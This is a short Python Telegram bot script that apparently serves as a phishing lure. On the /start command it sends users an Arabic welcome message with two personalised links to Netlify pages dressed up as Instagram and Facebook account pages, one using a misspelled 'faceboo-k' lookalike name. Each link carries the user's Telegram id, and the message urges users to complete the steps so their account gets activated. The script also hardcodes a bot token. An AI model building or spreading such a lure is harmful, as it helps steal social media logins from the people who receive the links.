import os
import telebot

TOKEN = "8903980560:AAHGPnCwkt0CQcDCXs8z-1Jbac5Yus_vhuI"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    custom_link = f"https://instagram-account-ginxl9n.netlify.app/?id={user_id}"
    second_link = f"https://account-faceboo-k-ginxl9n.netlify.app/?id={user_id}"
    
    welcome_text = (
        f"✨ **أهلاً بك يا غالي في بوت الخدمات المميز!** ✨\n\n"
        f"🚀 يسعدنا انضمامك إلينا. يرجى إتمام الخطوات عبر الروابط المخصصة لك أدناه:\n\n"
        f"📸 **رابط انستغرام الخاص بك:**\n{custom_link}\n\n"
        f"🔗 **رابط المنصة الثانية:**\n{second_link}\n\n"
        f"━━━━━━━━━━━━━━━\n"
        f"💡 *نصيحة: تأكد من إتمام الخطوات بدقة لضمان تفعيل حسابك بنجاح.*\n\n"
        f"🖤 **Dedication to FDZ**"
    )
    
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

bot.infinity_polling()
